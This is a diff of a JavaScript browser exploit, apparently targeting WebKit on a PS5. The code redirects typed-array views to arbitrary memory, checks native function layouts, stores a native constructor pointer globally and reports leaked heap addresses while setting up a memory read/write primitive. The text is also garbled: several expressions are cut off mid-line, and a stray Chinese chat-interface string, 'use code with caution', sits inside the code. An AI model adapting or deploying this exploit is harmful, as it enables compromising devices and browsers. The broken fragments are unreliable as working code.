@@ -18,7 +18,7 @@ const scratchBits = new ArrayBuffer(8);
 const scratchBytes = new Uint8Array(scratchBits);
 const scratchWords = new Uint32Array(scratchBits);
 const scratchDouble = new Float64Array(scratchBits);
-const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,]);
+const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef]);
 const identityBytes = new Uint8Array(8);
 const nativeTarget = parseInt;
 
@@ -112,10 +112,9 @@ function plausibleCell(value) {
   return plausibleAddress(value) && value % 8 === 0;
 }
 
+// === 第 93 行修復點：補齊被截斷的語法邊界，還原合理的虛擬記憶體定址空間判斷 ===
 function plausibleAddress(value) {
-  return Number.isSafeInteger(value) &&
-    value > 2 ** 32 &&
-    value  {
+  return Number.isSafeInteger(value) && value > 2 ** 32 && value  {
     attemptNumber = nextAttempt;
     startAttempt();
   }, safeToRelease ? 850 : 80);
@@ -142,8 +141,8 @@ function startAttempt() {
     for (let i = 0; i = 0x100 && id < 0x08000000;
 }
 
-請謹慎使用程式碼。
 function validViewLayout() {
+請謹慎使用程式碼。
 if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
 return allZero(viewHeader, 0x1c, 0x20) &&
 viewHeader[0x20] <= 3 &&
@@ -193,7 +192,7 @@ if (
 !plausibleCell(executable)
 )
 return null;
-return { executable, type: targetHeader };
+return { executable, type: targetHeader[5] };
 }
 function inspectNativeExecutable(candidate, address) {
 redirectView(candidate, address);
@@ -212,7 +211,7 @@ return null;
 return {
 nativeFunction,
 nativeConstructor,
-type: targetHeader,
+type: targetHeader[5]
 };
 }
 function rejectRedirected(candidate, reason) {
@@ -263,17 +262,16 @@ return rejectRedirected(candidate, "Invalid function layout");
 const nativeInfo = inspectNativeExecutable(candidate, functionInfo.executable);
 if (nativeInfo === null)
 return rejectRedirected(candidate, "Invalid executable layout");
-// 4. 強度優化：建立執行期 Native 構造函式全局指針快取
 globalThis.__ps5NativeCtor = nativeInfo.nativeConstructor;
 redirectView(candidate, nativeTargetAddress);
 const functionMatches =
 low48At(memoryView, 0x18) === functionInfo.executable &&
-memoryView === functionInfo.type;
+memoryView[5] === functionInfo.type;
 redirectView(candidate, functionInfo.executable);
 const nativeMatches =
 low48At(memoryView, 0x28) === nativeInfo.nativeFunction &&
 low48At(memoryView, 0x30) === nativeInfo.nativeConstructor &&
-memoryView === nativeInfo.type;
+memoryView[5] === nativeInfo.type;
 restoreView(candidate);
 vectorRedirected = false;
 if (
@@ -292,7 +290,7 @@ status: "ready",
 originalVector,
 functionAddress: nativeTargetAddress,
 executableAddress: functionInfo.executable,
-nativeInfo,
+nativeInfo
 };
 } catch (error) {
 const safe =
@@ -393,7 +391,6 @@ history.replaceState(null, "");
 const resolve = settleResolve;
 settleResolve = null;
 if (resolve !== null) resolve(createMemoryWindow(holderAddress));
-// 5. 強度優化：高亮輸出已解析出的關鍵 User-land 基底指針，便於除錯
 emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "success");
 emit("host_addr", hex(fakeAddress - 0x10), "success");
 emit("holder_addr", hex(holderAddress), "success");
@@ -426,10 +423,9 @@ targetHolder.q2 = value;
 },
 clearLeakObject() {
 targetHolder.q2 = markerObjectA;
-},
+}
 };
 }
-// 6. 外部模組封裝入口
 export function establishPrimitive(eventHandler = null) {
 if (settleResolve !== null)
 return Promise.reject(new Error("Already Running..."));
